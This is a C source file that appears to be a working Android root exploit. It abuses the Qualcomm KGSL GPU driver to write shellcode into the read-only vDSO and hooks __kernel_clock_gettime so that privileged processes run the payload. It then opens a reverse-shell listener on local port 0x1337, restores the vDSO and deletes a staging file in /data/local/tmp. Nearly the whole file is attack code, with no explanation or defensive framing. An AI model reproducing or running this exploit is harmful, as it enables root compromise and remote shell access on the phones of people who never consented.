#include <stdio.h>
#include <poll.h>
#include <errno.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/auxv.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include "payload.h"
#include "msm_kgsl.h"

#define DEVNAME "/dev/kgsl-3d0"
int fd;

unsigned long gpu_mapaddr(unsigned long hostptr, length)
{
    struct kgsl_map_user_mem mem_param;
    memset(&mem_param, 0, sizeof(mem_param));
    mem_param.len = length;
    mem_param.offset = 0;
    mem_param.hostptr = hostptr;
    mem_param.memtype = KGSL_USER_MEM_TYPE_ADDR;
    int ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &mem_param);
    return mem_param.gpuaddr;
}

int creatdrawid()
{
    struct kgsl_drawctxt_create drawid;
    drawid.flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC;
    drawid.drawctxt_id = 0;
    int ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &drawid);
    return drawid.drawctxt_id;
}

#define CP_MEM_WRITE 0x3D
#define CP_TYPE3_PKT ((unsigned int)3 << 30)
static inline uint cp_type3_packet(uint opcode, uint cnt)
{
	return CP_TYPE3_PKT | ((cnt-1) << 16) | (((opcode) & 0xFF) << 8);
}

void writemem(int drawid, int gpu_targetaddr, int *content, int sizedword)
{
    char *cmdbuffer = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, 0, 0);
    printf("cmdbuffer: %016lx\n", cmdbuffer);
    unsigned long gpu_cmdbuffer = gpu_mapaddr(cmdbuffer, 0x1000);
    printf("gpu_cmdbuffer: %016lx\n", gpu_cmdbuffer);

    unsigned int* cmdstart = cmdbuffer;
    unsigned int* cmdptr = cmdstart;
    *cmdptr++ = cp_type3_packet(CP_MEM_WRITE, 1 + sizedword);
    *cmdptr++ = gpu_targetaddr;
    for(int i = 0; i < sizedword; i++)
    {
        *cmdptr++ = content[i];
    }

    struct kgsl_ibdesc ibdesc = {
        .gpuaddr = gpu_cmdbuffer,
        .sizedwords = cmdptr - cmdstart
    };
    struct kgsl_ringbuffer_issueibcmds ibcmds = {
        .drawctxt_id = drawid,
        .ibdesc_addr = &ibdesc,
        .numibs = 1,
        .flags = KGSL_CONTEXT_SUBMIT_IB_LIST,
        .timestamp = 0
    };

    int ret = ioctl(fd, IOCTL_KGSL_RINGBUFFER_ISSUEIBCMDS, &ibcmds);
    printf("IOCTL_KGSL_RINGBUFFER_ISSUEIBCMDS ret: %d\n",ret);
}

static int setup_socket(uint16_t port)
{
    struct sockaddr_in addr;
    int enable, s;
    s = socket(AF_INET, SOCK_STREAM, 0);
    enable = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = port;
    bind(s, (struct sockaddr *) &addr, sizeof(addr));
    listen(s, 1);
    return s;
}

static int
writeall(int fd, const void *buf, size_t count)
{
    const char *p;
    ssize_t i;
    p = buf;
    do
    {
        i = write(fd, p, count);
        if (i == 0)
        {
            return -1;
        }
        else if (i == -1)
        {
            if (errno == EINTR)
            {
                continue;
            }
            return -1;
        }
        count -= i;
        p += i;
    }
    while (count > 0);
    return 0;
}

static void reverseshell(int s)
{
    struct sockaddr_in addr;
    struct pollfd fds[2];
    socklen_t addr_len;
    char buf[4096];
    nfds_t nfds;
    int c, n;

    printf("Waiting for reverse connect shell...\n");

    addr_len = sizeof(addr);
    while (1)
    {
        c = accept(s, (struct sockaddr *)&addr, &addr_len);
        if (c == -1)
        {
            if (errno == EINTR)
            {
                continue;
            }
        }
        break;
    }

    close(s);
    printf("TERMINAL>>>\n");
    fds[0].fd = STDIN_FILENO;
    fds[0].events = POLLIN;
    fds[1].fd = c;
    fds[1].events = POLLIN;
    nfds = 2;
    while (nfds > 0)
    {
        if (poll(fds, nfds, -1) == -1)
        {
            if (errno == EINTR)
            {
                continue;
            }
            break;
        }

        if (fds[0].revents == POLLIN)
        {
            n = read(STDIN_FILENO, buf, sizeof(buf));
            if (n == -1)
            {
                if (errno != EINTR)
                {
                    break;
                }
            }
            else if (n == 0)
            {
                break;
            }
            else
            {
                writeall(c, buf, n);
            }
        }

        if (fds[1].revents == POLLIN)
        {
            n = read(c, buf, sizeof(buf));
            if (n == -1)
            {
                if (errno != EINTR)
                {
                    break;
                }
            }
            else if (n == 0)
            {
                break;
            }
            else
            {
                writeall(STDOUT_FILENO, buf, n);
            }
        }
    }
    printf("TERMINAL END\n");
}

//__kernel_clock_gettime
char time_pattern[] = "\x1f\x00\x00\x71\x04\x18\x41\x7a\x81\x02\x00\x54";

#define VDSO_SIZE 0x1000
char vdso_org[VDSO_SIZE];
char vdso_new[VDSO_SIZE];

int main()
{
    fd = open(DEVNAME, O_RDWR);
    uint16_t port   = htons(0x1337); //0x1337
    uint32_t ip     = htonl(0x7f000001); //127.0.0.1
    printf("Reverse shell target: %s:%d\n", inet_ntoa(*(struct in_addr *)&ip), ntohs(port));

    unsigned long vdso_addr = (void *)getauxval(AT_SYSINFO_EHDR);

    memcpy(vdso_org, vdso_addr, VDSO_SIZE);
    memcpy(vdso_new, vdso_addr, VDSO_SIZE);
    printf("vdso_addr: %016lx\n", vdso_addr);
    char *timefunc_addr = memmem(vdso_new, VDSO_SIZE, time_pattern, 12);
    printf("timefunc_addr: %016lx\n", timefunc_addr);

    // MOV	X16, X30
    timefunc_addr[0] = '\xf0';
    timefunc_addr[1] = '\x03';
    timefunc_addr[2] = '\x1e';
    timefunc_addr[3] = '\xaa';

    // BL   ADDR_SHELLCODE
    short rel = VDSO_SIZE - payload_len - (int)(timefunc_addr - vdso_new) - 4;
    *(short *)&timefunc_addr[4] = rel / 4;
    timefunc_addr[6] = '\x00';
    timefunc_addr[7] = '\x94';

    memcpy(vdso_new + VDSO_SIZE - payload_len, payload, payload_len);
    if(payload_len % 4 != 0)
    {
        printf("payload should be 4-byte aligned\n");
    }
    int s = setup_socket(port);

    unsigned long gpu_vdso = gpu_mapaddr(vdso_addr, 0x1000);
    int drawid = creatdrawid();
    
    writemem(drawid, gpu_vdso + VDSO_SIZE - payload_len, vdso_new + VDSO_SIZE - payload_len, payload_len/4);
    while(memcmp(vdso_addr+(VDSO_SIZE - 0x10), "/system/bin/sh", 14))
    {
        sleep(1);
    }
    printf("shellcode patch done\n");

    sleep(2); //needy for the second writemem to work

    writemem(drawid, gpu_vdso + (timefunc_addr - vdso_new), timefunc_addr, 2);
    while(*(long*)timefunc_addr != *(long*)(vdso_addr+(timefunc_addr - vdso_new)))
    {
        sleep(1);
    }
    printf("hook patch done\n");
    reverseshell(s);

    sleep(2); //needy for the third writemem to work
    
    writemem(drawid, gpu_vdso + (timefunc_addr - vdso_new), vdso_org + (timefunc_addr - vdso_new), 2);
    while(*(long*)(vdso_org+(timefunc_addr - vdso_new)) != *(long*)(vdso_addr+(timefunc_addr - vdso_new)))
    {
        sleep(1);
    }
    printf("restore done\n");

    if (remove("/data/local/tmp/x") == -1)
    {
        printf("Please remove x manually\n");
    }
    return 0;
}
